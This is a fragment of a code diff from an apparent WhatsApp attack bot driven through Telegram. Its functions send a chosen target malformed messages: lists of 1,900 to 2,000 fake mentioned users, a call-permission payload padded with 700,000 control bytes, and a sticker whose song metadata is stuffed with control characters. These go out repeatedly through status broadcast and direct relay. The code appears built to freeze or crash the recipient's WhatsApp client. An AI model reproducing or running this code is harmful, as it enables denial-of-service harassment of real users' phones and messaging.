+        ...payload,
+        contextInfo: {
+          ...payload.contextInfo,
+          participant: "0@s.whatsapp.net",
+          mentionedJid: [
+            "0@s.whatsapp.net",
+            ...Array.from(
+              { length: 1900 },
+              () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+            ),
+          ],
+        },
+      },
+      {}
+    );
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+      messageId: msg.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                {
+                  tag: "to",
+                  attrs: { jid: target },
+                  content: [],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    });
+    await sleep(2000);
+  }
+  
+  const delayMsg = {
+    interactiveResponseMessage: {
+      body: {
+        text: "$",
+        format: "DEFAULT"
+      },
+      nativeFlowResponseMessage: {
+        name: "call_permission_request",
+        paramsJson: "\x10".repeat(700000),
+        version: 3,
+      },
+      entryPointConversionSource: "{}",
+      contextInfo: {
+        quotedMessage: {
+          paymentInviteMessage: {
+            serviceType: "FPM",
+            expiryTimestamp: 1814400000
+          }
+        },
+        mentionedJid: Array.from({ length: 100 }, () => "0@newsletter"),
+        groupMentions: [
+          {
+            groupJid: "0@newsletter",
+            groupSubject: "."
+          }
+        ],
+        participant: target,
+        remoteJid: target
+      }
+    }
+  };
+
+  await sock.relayMessage(target, delayMsg, {
+    participant: { jid: target }
+  });
+  const mentionedJids = Array.from({ length: 2000 }, (_, i) => `628${i + 1}990${i + 1}@s.whatsapp.net`);
+  const stickerMsg = {
+    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
+    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
+    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
+    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
+    "mimetype": "image/webp",
+    "height": 512,
+    "width": 512,
+    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
+    "fileLength": "37824",
+    "mediaKeyTimestamp": "1771680407",
+    "isAnimated": false,
+    "stickerSentTs": "1771694793768",
+    "isAvatar": true,
+    "isAiSticker": true,
+    "isLottie": false,
+    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAQIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k=",
+    contextInfo: {
+      mentionedJid: mentionedJids,
+      pairedMediaType: "HD_IMAGE_CHILD",
+      statusSourceType: "MUSIC_STANDALONE",
+      statusAttributions: [
+        {
+          type: "STATUS_MENTION",
+          music: {
+            authorName: "kelra",
+            songId: "1137812656623908",
+            title: "\u0003".repeat(1000),
+            author: "\u0003".repeat(1000),
+            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
+            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
+            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
+            artworkMediaKey: "1771689153",
+            artistAttribution: " x ",
+            isExplicit: true
+          }
+        }
+      ]
+    },
+    annotations: [
+      {
+        embeddedContent: {
+          embeddedMusic: {
+            musicContentMediaId: "589608164114571",
+            songId: "870166291800508",
+            title: "\u0003".repeat(1000),
+            author: "\u0003".repeat(1000),
+            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
+            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
+            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
+            artistAttribution: "https://t.me/null",
+            countryBlocklist: true,
+            isExplicit: true,
+            artworkMediaKey: "1771689153"
+          }
+        },
+        embeddedAction: true
+      }
+    ]
+  };
+
+  await sock.relayMessage("status@broadcast", {
+    stickerMessage: stickerMsg
+  },
+  {
+    statusJidList: [target]
+  });
+}
+
+//-------------- END FUNCTION -------------//
+bot.launch();
